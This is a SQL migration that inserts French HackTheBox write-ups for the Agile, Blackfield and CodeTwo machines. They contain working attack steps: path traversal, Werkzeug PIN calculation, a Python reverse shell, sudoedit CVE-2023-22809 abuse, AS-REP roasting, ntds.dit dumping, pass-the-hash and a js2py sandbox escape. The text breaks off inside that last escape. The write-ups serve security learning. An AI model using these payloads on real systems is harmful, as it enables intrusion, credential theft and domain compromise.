-- Migration to add writeups from .write-up directory
-- Generated on 2026-03-03T13:15:24.073Z


-- Writeup: Agile
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: Agile',
  'hackthebox-agile',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Linux</div>
</div>


# Phase 1 : Reconnaissance & Brèche Initiale

L''objectif de cette phase est d''identifier la surface d''attaque de la machine **Agile** et d''exploiter une vulnérabilité de lecture de fichiers pour compromettre le mode **Debug** du framework **Flask**, nous permettant ainsi d''obtenir une exécution de code à distance (**RCE**).

## Énumération des Services

Je commence par un scan **Nmap** complet pour identifier les ports ouverts et les services associés.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.203

# Scan détaillé des services identifiés
nmap -p 22,80 -sCV 10.10.11.203
```

Le scan révèle deux ports :
*   **22/tcp (SSH)** : OpenSSH 8.9p1.
*   **80/tcp (HTTP)** : Nginx 1.18.0, redirigeant vers `http://superpass.htb`.

J''ajoute l''entrée correspondante à mon fichier `/etc/hosts` :
```bash
echo "10.10.11.203 superpass.htb" | sudo tee -a /etc/hosts
```

## Analyse de l''Application Web

L''application **SuperPass** est un gestionnaire de mots de passe. Après avoir créé un compte, je peux ajouter des entrées et les exporter au format **CSV**. 

L''analyse des en-têtes **HTTP** et des pages d''erreur (404 standard de **Werkzeug**) confirme que le backend repose sur **Python Flask**. Une recherche de répertoires avec **Feroxbuster** ne révèle pas de points d''entrée cachés immédiats, mais confirme la structure classique d''une application **Flask** (`/static`, `/vault`, `/download`).

## Identification des Vulnérabilités

En examinant la fonctionnalité d''exportation, je remarque que le bouton "Export" génère une requête `GET` vers `/download?fn=[username]_export_[id].csv`. 

### 1. Path Traversal / Arbitrary File Read
Le paramètre `fn` est vulnérable à un **Path Traversal**. Je peux lire des fichiers sensibles sur le système en remontant l''arborescence.

```bash
# Test de lecture du fichier /etc/passwd
curl --path-as-is "http://superpass.htb/download?fn=../../../../etc/passwd" -b "session=[COOKIE]"
```

### 2. Flask Debug Mode & Information Leakage
Si je fournis un nom de fichier inexistant, l''application crash et affiche la page de **Debug** de **Werkzeug**. Cette page est une mine d''or car elle contient :
*   La **Stack Trace** complète.
*   Les variables d''environnement.
*   Un **Interactive Console** (protégé par un **PIN**).

> **Schéma Mental : De la lecture de fichier à la RCE**
> LFI (Lecture de fichiers) -> Récupération des variables système spécifiques -> Calcul du PIN Werkzeug -> Accès à la Console Python -> Reverse Shell.

## Exploitation : Calcul du Werkzeug Debug PIN

Depuis la version 0.11 de **Werkzeug**, la console interactive est protégée par un **PIN**. Ce PIN n''est pas aléatoire mais généré à partir de variables spécifiques au système. Grâce à la **LFI**, je peux extraire ces données.

### Collecte des "Public Bits"
1.  **Username** : Trouvé via `/proc/self/environ` -> `www-data`.
2.  **Module name** : Généralement `flask.app`.
3.  **App name** : Généralement `Flask` ou `wsgi_app`.
4.  **Flask Path** : Trouvé dans la stack trace -> `/app/venv/lib/python3.10/site-packages/flask/app.py`.

### Collecte des "Private Bits"
1.  **MAC Address** :
    *   Je cherche l''interface réseau via `/proc/net/arp` -> `eth0`.
    *   Je lis l''adresse MAC : `/sys/class/net/eth0/address` -> `00:50:56:b9:48:b5`.
    *   Conversion en décimal : `int("005056b948b5", 16)` -> `345052367029`.
2.  **Machine ID** :
    *   Lecture de `/etc/machine-id` -> `ed5b159560f54721827644bc9b220d00`.
    *   Concaténé avec la dernière partie de `/proc/self/cgroup` -> `superpass.service`.
    *   ID final : `ed5b159560f54721827644bc9b220d00superpass.service`.

### Génération du PIN
J''utilise un script Python pour générer le PIN en utilisant l''algorithme **SHA1** (utilisé par les versions récentes de **Werkzeug**).

```python
import hashlib
from itertools import chain

probably_public_bits = [
    ''www-data'',
    ''flask.app'',
    ''wsgi_app'', # Spécifique à Gunicorn/WSGI ici
    ''/app/venv/lib/python3.10/site-packages/flask/app.py''
]

private_bits = [
    ''345052367029'',
    ''ed5b159560f54721827644bc9b220d00superpass.service''
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode(''utf-8'')
    h.update(bit)
h.update(b''cookiesalt'')

num = None
if num is None:
    h.update(b''pinsalt'')
    num = (''%09d'' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for i in range(3):
        rv = rv or ""
        rv += num[i * 3:i * 3 + 3]
        if i < 2:
            rv += "-"

print(rv)
```

## Obtention du Premier Shell

Une fois le **PIN** (ex: `962-630-184`) saisi dans la console de debug, j''accède à un interpréteur Python interactif.

1.  Je prépare un listener sur ma machine : `nc -lvnp 443`.
2.  J''exécute le payload suivant dans la console **Werkzeug** :

```python
import os
os.popen(''python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\''10.10.14.X\'',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\''/bin/bash\'') shades"'').read()
```

Je reçois une connexion en tant que **www-data**. Pour stabiliser mon shell :
```bash
python3 -c ''import pty;pty.spawn("/bin/bash")''
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

## Pivot vers l''utilisateur Corum

En explorant le système, je trouve le fichier de configuration de production `/app/config_prod.json` qui contient des identifiants de base de données.

```json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```

Je me connecte à la base de données **MySQL** pour extraire les mots de passe stockés par les utilisateurs de l''application :

```bash
mysql -u superpassuser -p''dSA6l7q*yIVs$39Ml6ywvgK'' superpass -e "SELECT * FROM passwords;"
```

Je récupère le mot de passe de l''utilisateur **corum** pour l''application "agile" : `5db7caa1d13cc37c9fc2`. Ce mot de passe est réutilisé pour son compte système.

```bash
ssh corum@superpass.htb
# Password: 5db7caa1d13cc37c9fc2
```

---

### 1. Post-Exploitation Initiale : Extraction de la Base de Données

Une fois mon accès **www-data** stabilisé via le **Flask Debugger**, ma priorité est l''énumération des fichiers de configuration pour trouver des vecteurs de mouvement latéral. Le fichier `/app/config_prod.json` contient des identifiants de base de données en clair.

```bash
# Lecture de la configuration MySQL
cat /app/config_prod.json
# Connexion et dump des credentials applicatifs
mysql -u superpassuser -p''dSA6l7q*yIVs$39Ml6ywvgK'' superpass -e "SELECT * FROM passwords;"
```

L''extraction révèle le mot de passe de l''utilisateur **corum** (`5db7caa1d13cc37c9fc2`). Ce dernier réutilise ses identifiants pour son accès système via **SSH**.

---

### 2. Mouvement Latéral : Exploitation du Chrome Remote Debugging

En explorant le répertoire `/app`, je découvre une instance de test (`app-testing`) et un script `test_and_update.sh`. Ce script exécute des tests fonctionnels via **PyTest** et **Selenium** dans un **Virtual Environment** partagé.

> **Schéma Mental :** Le script de test automatise une instance **Chrome** en mode **Headless**. L''activation du paramètre `--remote-debugging-port=41829` ouvre une interface de contrôle à distance. Si un utilisateur (ici **edwards**) est connecté dans cette instance de test, je peux intercepter sa session en m''attachant au port de debug.

#### Énumération du port de Debug
```bash
# Vérification du port d''écoute local
netstat -tnlp | grep 41829
```

#### Tunneling et Interception de Session
Pour accéder à l''interface de debug depuis ma machine d''attaque, j''établis un **SSH Tunneling** :
```bash
ssh -L 41829:127.0.0.1:41829 corum@superpass.htb
```

J''utilise ensuite un navigateur basé sur Chromium (`chrome://inspect`) pour m''attacher à l''instance distante. Dans l''onglet **Application**, je récupère les **Session Cookies** de l''utilisateur **edwards**. En injectant ces cookies sur l''instance de test (`test.superpass.htb`), j''accède à son **Vault** personnel et récupère son mot de passe système : `d07867c6267dcb5df0af`.

---

### 3. Escalade de Privilèges : CVE-2023-22809 & Venv Poisoning

L''utilisateur **edwards** dispose de privilèges **Sudo** spécifiques permettant d''éditer des fichiers de configuration via `sudoedit`.

```bash
# Vérification des privilèges sudo
sudo -l
# (dev_admin : dev_admin) sudoedit /app/config_test.json
```

#### Analyse de la vulnérabilité
Le système exécute **Sudo version 1.9.9**, vulnérable à la **CVE-2023-22809**. Cette faille permet d''injecter des arguments supplémentaires via les variables d''environnement (`EDITOR`), autorisant l''édition de fichiers arbitraires tant qu''ils sont modifiables par l''utilisateur ou le groupe cible (**dev_admin**).

> **Schéma Mental :** Le fichier `/etc/bash.bashrc` force tous les utilisateurs à sourcer le script `activate` du **Virtual Environment** (`/app/venv/bin/activate`) lors de la connexion. Ce script est la propriété du groupe **dev_admin**. En utilisant la **CVE-2023-22809**, je peux modifier ce script pour y injecter une charge utile qui sera exécutée par **root** lors de sa prochaine session.

#### Injection du Payload
J''exploite `sudoedit` pour modifier le script d''activation du **venv** :

```bash
# Détournement de sudoedit pour cibler le script activate
EDITOR=''vim -- /app/venv/bin/activate'' sudoedit -u dev_admin /app/config_test.json
```

À la fin du fichier, j''ajoute une commande pour créer un **SUID Bash** :
```bash
cp /bin/bash /tmp/0xdf && chmod +s /tmp/0xdf
```

Dès qu''une tâche système ou qu''un administrateur (root) déclenche une session (sourçant ainsi le venv), le binaire SUID est généré.

```bash
# Obtention du shell root
/tmp/0xdf -p
```

---

### Phase 3 : Élévation de Privilèges & Domination

#### 1. Pivot vers l''utilisateur Edwards : Abus du Remote Debugging Port

Une fois l''accès initial obtenu en tant que **corum**, l''énumération du répertoire `/app` révèle une instance de test parallèle (`app-testing`). Un script, `test_and_update.sh`, exécute périodiquement des tests via **PyTest** et **Selenium** en utilisant un **Headless Chrome**.

L''analyse du fichier `test_site_interactively.py` montre que Chrome est lancé avec l''argument `--remote-debugging-port=41829`. Ce port permet de prendre le contrôle total de l''instance du navigateur à distance.

> **Schéma Mental :**
> Compromission Corum -> Identification d''un processus Chrome (Selenium) appartenant à un autre utilisateur -> SSH Tunneling du port de debug (41829) -> Attachement via un navigateur local -> Vol de Session (Cookies) sur l''instance de test -> Extraction des credentials Edwards.

**Exploitation du Debug Port :**

1. **Tunneling SSH :** J''établis un tunnel pour accéder au port local de la machine cible depuis ma machine d''attaque.
```bash
ssh -L 41829:127.0.0.1:41829 corum@superpass.htb
```

2. **Inspection via Chromium :** Sur ma machine, j''ouvre `chrome://inspect`. Dans la configuration, j''ajoute `localhost:41829`. L''instance de test apparaît. En inspectant l''onglet **Application**, je récupère le cookie de session de l''utilisateur **edwards** qui est actuellement testé par le script automatique.

3. **Accès au Vault :** En injectant ce cookie sur `http://test.superpass.htb` (via un tunnel sur le port 5555), j''accède au coffre-fort de **edwards** et récupère son mot de passe SSH : `d07867c6267dcb5df0af`.

---

#### 2. Élévation Root : CVE-2023-22809 & Hijacking de Virtual Environment

En tant que **edwards**, l''exécution de `sudo -l` révèle des privilèges spécifiques sur **sudoedit** :

```bash
(dev_admin : dev_admin) sudoedit /app/config_test.json
(dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

La version de **sudo** (1.9.9) est vulnérable à la **CVE-2023-22809**. Cette faille permet d''injecter des fichiers arbitraires dans la variable d''environnement `EDITOR`, forçant **sudoedit** à ouvrir un fichier pour lequel nous n''avons normalement pas de droits d''écriture.

> **Schéma Mental :**
> Sudoedit vulnérable -> Injection de fichier via variable d''environnement -> Cible : Script d''activation du Virtual Environment (VENV) -> Le VENV est sourcé par Root lors de chaque login (via /etc/bash.bashrc) -> Exécution de code arbitraire lors de la prochaine session Root.

**Vecteur d''attaque :**

Le fichier `/etc/bash.bashrc` force tous les utilisateurs, y compris **root**, à sourcer `/app/venv/bin/activate`. Ce fichier appartient au groupe `dev_admin`, sur lequel je peux obtenir un accès en écriture via la **CVE-2023-22809**.

**Exploitation finale :**

1. **Injection via Sudoedit :**
```bash
EDITOR=''vim -- /app/venv/bin/activate'' sudoedit -u dev_admin /app/config_test.json
```

2. **Payload :** J''ajoute la ligne suivante à la fin du script `activate` pour créer un binaire **SUID** :
```bash
cp /bin/bash /tmp/0xdf && chmod +s /tmp/0xdf
```

3. **Trigger :** Il suffit d''attendre qu''une tâche planifiée ou qu''un administrateur se connecte. Une fois le fichier `/tmp/0xdf` créé :
```bash
/tmp/0xdf -p
# id -> uid=0(root)
```

---

#### 3. Analyse Post-Exploitation (Beyond Root)

L''analyse du code source après compromission totale a révélé deux vulnérabilités majeures qui auraient pu permettre des chemins d''attaque alternatifs (**Unintendeds**).

**A. Insecure Direct Object Reference (IDOR) :**
Dans `password_service.py`, la fonction `get_password_by_id` présentait une erreur de logique dans la requête **SQLAlchemy**.
```python
# Code vulnérable
password = session.query(Password).filter(Password.id == id, User.id == userid).first()
```
Le filtre comparait `User.id` au lieu de `Password.userid`. Comme l''objet `Password` n''était pas correctement lié à `User` dans cette requête, le filtre sur l''utilisateur était inopérant. Un attaquant pouvait donc énumérer les IDs de mots de passe de n''importe quel utilisateur via l''endpoint `/vault/row/<id>`.

**B. Flask Secret Key Statique :**
Initialement, l''application utilisait une **SECRET_KEY** codée en dur.
```python
app.config[''SECRET_KEY''] = ''super-secret-key-prowess'' # Exemple
```
Avec cette clé, un attaquant ayant lu le code source (via la **LFI** initiale) pouvait forger ses propres **Session Cookies** pour usurper l''identité de n''importe quel utilisateur (notamment **corum** ou **edwards**) sans passer par le **Flask Debugger**. Le correctif a consisté à utiliser `os.urandom(32)` pour générer une clé unique à chaque démarrage du service.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Flask', 'LFI', 'Werkzeug', 'Sudoedit', 'CVE-2023-22809'],
  'L''objectif de cette phase est d''identifier la surface d''attaque de la machine **Agile** et d''exploiter une vulnérabilité de lecture de fichiers pour compromettre le mode **Debug** du framework **Flask...',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: Blackfield
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: Blackfield',
  'hackthebox-blackfield',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Hard</div>
  <div class="points">Points: 40</div>
  <div class="os">OS: Windows</div>
</div>



### Phase 1 : Reconnaissance & Brèche Initiale

L''objectif de cette phase est de cartographier la surface d''attaque de la machine **Blackfield** et d''identifier un vecteur d''entrée via l''énumération des services **Active Directory** classiques.

#### 1. Énumération des Services (Scanning)

Je débute par un scan **Nmap** exhaustif pour identifier les ports TCP ouverts, suivi d''un scan de services et de scripts par défaut.

```bash
# Scan TCP complet
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.192

# Scan de scripts et versions sur les ports identifiés
nmap -p 53,88,135,389,445,593,3268,5985 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.192

# Scan UDP rapide sur les ports critiques
nmap -sU -p 53,389 --min-rate 10000 10.10.10.192
```

**Résultats clés :**
*   **Port 53 (DNS) :** Le domaine est **BLACKFIELD.local**. Une tentative de **Zone Transfer (AXFR)** via `dig` échoue, ce qui est attendu sur un contrôleur de domaine sécurisé.
*   **Port 389/3268 (LDAP) :** Confirme le nom du domaine et le nom d''hôte **DC01**. L''énumération anonyme est restreinte (Bind requis pour lister les objets).
*   **Port 445 (SMB) :** Le service est ouvert. **CrackMapExec** confirme qu''il s''agit d''un **Windows 10.0 Build 17763** (Windows Server 2019).
*   **Port 88 (Kerberos) :** Présence indispensable pour une attaque de type **AS-REP Roasting**.

#### 2. Énumération SMB et Collecte de Usernames

En testant une **Null Connection** sur le service **SMB**, je découvre que le partage `profiles$` est accessible en lecture seule.

```bash
# Vérification des partages accessibles sans authentification
smbmap -H 10.10.10.192 -u null

# Exploration du partage profiles$
smbclient -N //10.10.10.192/profiles$
```

Le partage contient plus de 300 répertoires. Bien que les dossiers soient vides, leurs noms correspondent à des comptes utilisateurs du domaine. C''est une mine d''or pour une attaque par dictionnaire ou du **Password Spraying**. Je monte le partage localement pour extraire proprement cette liste.

```bash
mount -t cifs //10.10.10.192/profiles$ /mnt -o password=
ls -1 /mnt/ > users.txt
umount /mnt
```

> **Schéma Mental : De l''énumération anonyme à la liste d''utilisateurs**
>
> Accès Anonyme (SMB) ➔ Partage `profiles$` ➔ Noms de dossiers ➔ **User Enumeration** ➔ Préparation de l''attaque Kerberos.

#### 3. Vecteur d''Entrée : AS-REP Roasting

Avec une liste d''utilisateurs valides, je teste la vulnérabilité **AS-REP Roasting**. Cette attaque cible les comptes ayant l''attribut `UF_DONT_REQUIRE_PREAUTH` activé. Pour ces utilisateurs, le **KDC (Key Distribution Center)** envoie un ticket **AS-REP** chiffré avec le hash du mot de passe de l''utilisateur sans demander de pré-authentification.

```bash
# Utilisation de GetNPUsers d''Impacket pour tester la liste
for user in $(cat users.txt); do 
    GetNPUsers.py -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep "krb5asrep"; 
done
```

Le script identifie l''utilisateur **support** comme étant vulnérable et récupère son hash **AS-REP**.

#### 4. Crackage de Hash et Validation

Je procède au crackage hors-ligne du hash récupéré en utilisant **Hashcat** avec la wordlist `rockyou.txt`.

```bash
# Crackage du hash Kerberos 5 AS-REP (Mode 18200)
hashcat -m 18200 support.hash /usr/share/wordlists/rockyou.txt --force
```

Le mot de passe est identifié : **#00^BlackKnight**.

Je valide les identifiants via **CrackMapExec** sur le protocole **SMB** pour confirmer l''accès.

```bash
crackmapexec smb 10.10.10.192 -u support -p ''#00^BlackKnight''
```

**Résultat :** Authentification réussie (`[+] BLACKFIELD.local\support:#00^BlackKnight`). L''utilisateur n''a pas de droits d''administration directe (**Pwn3d!** absent), mais il possède désormais un accès authentifié pour une énumération plus profonde du domaine via **BloodHound** ou **LDAP**.

---

### Énumération des Utilisateurs & AS-REP Roasting

L''énumération initiale via une **Null Session** sur le partage SMB `profiles$` m''a permis de récupérer une liste massive de noms de répertoires, correspondant aux noms d''utilisateurs du domaine. Après avoir monté le partage et nettoyé la sortie, je dispose d''un fichier `users.txt` contenant plus de 300 entrées.

Je teste cette liste pour la vulnérabilité **AS-REP Roasting**. Cette attaque cible les comptes dont l''attribut `UF_DONT_REQUIRE_PREAUTH` est activé, permettant de demander un ticket Kerberos sans authentification préalable et de tenter un cassage hors-ligne de la partie chiffrée.

```bash
# Extraction des hashes AS-REP
for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep krb5asrep; done

# Cassage du hash avec Hashcat
hashcat -m 18200 support.hash /usr/share/wordlists/rockyou.txt --force
```
**Credentials identifiés :** `support : #00^BlackKnight`

---

### Mouvement Latéral : De Support à Audit2020

Bien que le compte `support` n''ait pas d''accès **WinRM**, il possède des privilèges spécifiques au sein de l''**Active Directory**. J''utilise **BloodHound.py** pour cartographier les relations d''objets depuis ma machine Linux.

```bash
bloodhound-python -c ALL -u support -p ''#00^BlackKnight'' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192
```

L''analyse des données dans l''interface **BloodHound** révèle que l''utilisateur `support` possède le privilège **ForceChangePassword** sur l''utilisateur `audit2020`. Ce droit permet de réinitialiser le mot de passe d''une cible sans connaître l''ancien, via **RPC**.

> **Schéma Mental : Exploitation d''ACL**
> Support -> [ForceChangePassword] -> Audit2020.
> L''attaque utilise l''interface **MS-SAMR** via **rpcclient** pour modifier l''attribut de mot de passe de l''objet cible directement sur le **Domain Controller**.

```bash
# Réinitialisation du mot de passe via rpcclient
rpcclient -U ''blackfield.local/support%#00^BlackKnight'' 10.10.10.192 -c ''setuserinfo2 audit2020 23 "0xdf!!!"''
```
**Credentials mis à jour :** `audit2020 : 0xdf!!!`

---

### Analyse de Forensic & Extraction LSASS

En me connectant avec le compte `audit2020`, un nouveau partage SMB nommé `forensic` devient accessible. Ce partage contient des artefacts d''une analyse mémoire précédente, notamment des fichiers `.zip` contenant des dumps de processus.

Le fichier `lsass.zip` est particulièrement critique. Il contient un dump mémoire du processus **lsass.exe**, qui stocke souvent des credentials en cache (hashes NT, tickets Kerberos). J''utilise **pypykatz** pour parser ce fichier localement.

```bash
# Extraction et analyse du dump LSASS
unzip lsass.zip
pypykatz lsa minidump lsass.DMP
```

L''analyse extrait le **NT Hash** de l''utilisateur `svc_backup`. Ce compte dispose d''un accès **WinRM**, me permettant d''obtenir un shell stable.

**Credentials (Hash) :** `svc_backup : 9658d1d1dcd9250115e2205d9f48400d`

---

### Escalade de Privilèges : SeBackupPrivilege & NTDS.dit

L''utilisateur `svc_backup` est membre du groupe **Backup Operators** et possède le privilège **SeBackupPrivilege**. Ce droit est conçu pour permettre la sauvegarde de fichiers en ignorant les **DACL** (Access Control Lists), ce qui équivaut à un droit de lecture universel sur le système de fichiers.

Mon objectif est de récupérer le fichier `ntds.dit` (la base de données de l''AD) et la ruche **SYSTEM** pour extraire les hashes de tous les utilisateurs du domaine, y compris l''**Administrator**.

> **Schéma Mental : Bypassing File Locks**
> Le fichier `ntds.dit` est verrouillé par le système car il est constamment utilisé par le service **Active Directory Domain Services**. Pour le copier, il faut créer un **Volume Shadow Copy (VSS)**, qui permet de prendre un "instantané" du disque à un instant T, rendant les fichiers verrouillés accessibles en lecture.

J''utilise l''utilitaire **diskshadow** avec un script de configuration pour exposer une copie conforme du disque `C:` sur un nouveau lecteur `Z:`.

```powershell
# Contenu de vss.dsh (format DOS requis)
set context persistent nowriters
set metadata c:\programdata\df.cab
add volume c: alias df
create
expose %df% z:
```

Exécution de l''attaque :
```powershell
# Création du Shadow Copy
diskshadow /s c:\programdata\vss.dsh

# Copie des fichiers sensibles via les CmdLets SeBackupPrivilege
import-module .\SeBackupPrivilegeCmdLets.dll
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit C:\programdata\ntds.dit
reg.exe save hklm\system C:\programdata\system.hive
```

Une fois les fichiers exfiltrés sur ma machine d''attaque, j''utilise **secretsdump.py** pour extraire les hashes.

```bash
secretsdump.py -system system.hive -ntds ntds.dit LOCAL
```

**Hash Administrator :** `184fb5e5178480be64824d4cd53b99ee`

L''accès final est obtenu via **Pass-The-Hash** sur le service **WinRM**.

```bash
evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l''accès établi en tant que **svc_backup**, l''énumération des privilèges via `whoami /priv` révèle des vecteurs critiques. Ce compte possède la **SeBackupPrivilege** et la **SeRestorePrivilege**. Dans un environnement **Active Directory**, ces privilèges sont synonymes de compromission totale du **Domain Controller**.

#### 1. Abus de la SeBackupPrivilege

La **SeBackupPrivilege** permet de lire n''importe quel fichier sur le système, en ignorant les **Access Control Lists (ACL)** définies par le système de fichiers. L''objectif ici est d''extraire la base de données de l''**Active Directory** : le fichier `ntds.dit`.

> **Schéma Mental :**
> Privilège Backup -> Bypass des DACLs -> Accès aux fichiers sensibles (SAM, SYSTEM, NTDS.DIT) -> Extraction des Hashes de tout le domaine.

Cependant, le fichier `ntds.dit` est verrouillé par le processus `lsass.exe` car il est constamment utilisé par le système. Pour contourner ce verrouillage, j''utilise le service **Volume Shadow Copy (VSS)** via l''utilitaire **DiskShadow**.

#### 2. Extraction de la base NTDS via DiskShadow

Comme je n''ai pas d''accès interactif (GUI), je dois scripter **DiskShadow**. Je crée un fichier de configuration (`vss.dsh`) pour créer un instantané du disque `C:`, l''exposer sur une nouvelle lettre de lecteur (`Z:`), puis copier les fichiers nécessaires.

```powershell
# Contenu de vss.dsh (Format DOS requis via unix2dos)
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:

# Exécution de DiskShadow
diskshadow /s c:\programdata\vss.dsh
```

Une fois le **Shadow Copy** monté sur `Z:`, j''utilise des outils spécifiques pour copier le fichier tout en conservant les privilèges de backup. J''utilise les DLL de `SeBackupPrivilegeCmdLets`.

```powershell
# Import des modules d''exploitation
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll

# Copie du NTDS.DIT et extraction de la ruche SYSTEM pour le déchiffrement
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit C:\programdata\ntds.dit
reg.exe save hklm\system C:\programdata\system.hive
```

#### 3. Extraction des Hashes et Pass-the-Hash

Avec `ntds.dit` et `system.hive` exfiltrés sur ma machine d''attaque, j''utilise **secretsdump.py** de la suite **Impacket** pour dumper les hashes **NTLM** de tous les utilisateurs du domaine, y compris l''**Administrator**.

```bash
secretsdump.py -system system.hive -ntds ntds.dit LOCAL
# Résultat : Administrator:500:aad3...:184fb5e5178480be64824d4cd53b99ee:::
```

Il ne reste plus qu''à effectuer une attaque **Pass-the-Hash** pour obtenir un shell **SYSTEM** via **Evil-WinRM**.

```bash
evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
```

---

### Analyse Post-Exploitation "Beyond Root"

#### Le mystère du root.txt et l''EFS
Lors de l''utilisation de la **SeBackupPrivilege**, une tentative de lecture directe de `C:\Users\Administrator\Desktop\root.txt` échoue avec un message "Access Denied", ce qui est paradoxal pour un privilège de backup. L''analyse montre que le fichier est protégé par l''**Encrypting File System (EFS)**.

> **Schéma Mental :**
> SeBackupPrivilege (Bypass ACL) != EFS Decryption (Cryptographie). Le privilège permet de copier le bloc de données chiffré, mais pas de lire son contenu en clair sans la clé privée de l''utilisateur.

#### Le script Watcher.ps1
Un script de persistance/protection nommé `watcher.ps1` tourne en boucle sur la machine. Sa fonction est de surveiller la date de modification de `root.txt`. Si le fichier est modifié (par exemple, lors d''une rotation de flag par la plateforme HTB), le script force immédiatement son chiffrement via la méthode `.Encrypt()`.

```powershell
$file = "C:\Users\Administrator\Desktop\root.txt"
$command = "(Get-Item -Path $file).Encrypt()"
# ... boucle de surveillance ...
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { $command }
```

Cette configuration explique pourquoi même avec des privilèges de backup, l''accès au flag nécessite impérativement la compromission du compte **Administrator** pour obtenir le contexte cryptographique nécessaire au déchiffrement transparent d''**EFS**.',
  'HackTheBox',
  'Hard',
  40,
  ARRAY['Active Directory', 'AS-REP Roasting', 'BloodHound', 'SeBackupPrivilege', 'LSASS'],
  'L''objectif de cette phase est de cartographier la surface d''attaque de la machine **Blackfield** et d''identifier un vecteur d''entrée via l''énumération des services **Active Directory** classiques.',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: CodeTwo
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: CodeTwo',
  'hackthebox-codetwo',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Hard</div>
  <div class="points">Points: 40</div>
  <div class="os">OS: Windows</div>
</div>


# Phase 1 : Reconnaissance & Brèche Initiale

## Énumération des Services

La phase de reconnaissance commence par un **TCP Port Scan** agressif pour identifier la surface d''attaque.

```bash
# Scan rapide de tous les ports
nmap -p- -vvv --min-rate 10000 10.10.11.82

# Scan de services détaillé sur les ports identifiés
nmap -p 22,8000 -sCV 10.10.11.82
```

Les résultats révèlent deux services actifs :
*   **Port 22 (SSH)** : OpenSSH 8.2p1 (Ubuntu).
*   **Port 8000 (HTTP)** : Serveur **Gunicorn** 20.0.4, hébergeant une application **Flask**.

## Analyse de l''Application Web

Le service sur le port 8000 est une plateforme nommée "CodeTwo", présentée comme un **Developer Sandbox** permettant d''exécuter du code **JavaScript**. 

Points clés identifiés lors de l''exploration :
1.  **Source Code Disclosure** : Un lien "Download App" permet de récupérer `app.zip`, contenant l''intégralité du code source Python (`app.py`) et une base de données **SQLite** (`users.db`).
2.  **Authentication** : L''application permet l''enregistrement d''utilisateurs. Les sessions sont gérées via des **Flask Cookies** signés.
3.  **Execution Engine** : Le code JavaScript soumis via le endpoint `/run_code` est traité par la bibliothèque Python **js2py**.

### Analyse du Code Source (`app.py`)

L''analyse statique du fichier `app.py` montre l''utilisation de `js2py.eval_js(code)` pour interpréter les entrées utilisateur. Bien que le développeur ait tenté de sécuriser l''environnement avec `js2py.disable_pyimport()`, cette mesure est insuffisante face à des techniques d''évasion avancées.

Le fichier `requirements.txt` confirme la version vulnérable :
```text
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

## Identification de la Vulnérabilité : CVE-2024-28397

La bibliothèque **js2py** (version <= 0.74) est sujette à une **Sandbox Escape** majeure référencée sous la **CVE-2024-28397**. Puisque **js2py** traduit le JavaScript en objets Python avant exécution, un attaquant peut remonter l''arborescence des objets Python pour accéder aux classes de base et importer des modules dangereux comme `os` ou `subprocess`.

> **Schéma Mental : Sandbox Escape via Prototype Pollution / Object Discovery**
> 1. En JavaScript, on accède à un objet Python via un dictionnaire vide `{}`.
> 2. On utilise `__getattribute__` pour récupérer la classe de l''objet (`__class__`).
> 3. On remonte à la classe parente `object` via `__base__`.
> 4. On énumère toutes les classes chargées en mémoire avec `__subclasses__()`.
> 5. On localise la classe `subprocess.Popen` pour exécuter des commandes système sur l''hôte Linux.

## Exploitation et Premier Shell

Pour vérifier l''exécution de code, j''utilise un payload JS conçu pour déclencher un **ICMP Echo Request** (ping) vers ma machine d''attaque.

```javascript
// Payload de test (RCE aveugle)
let hacked = Object.getOwnPropertyNames({});
let bymarve = hacked.__getattribute__;
let n11 = bymarve("__getattribute__");
let obj = n11("__class__").__base__;

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i];
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item;
        }
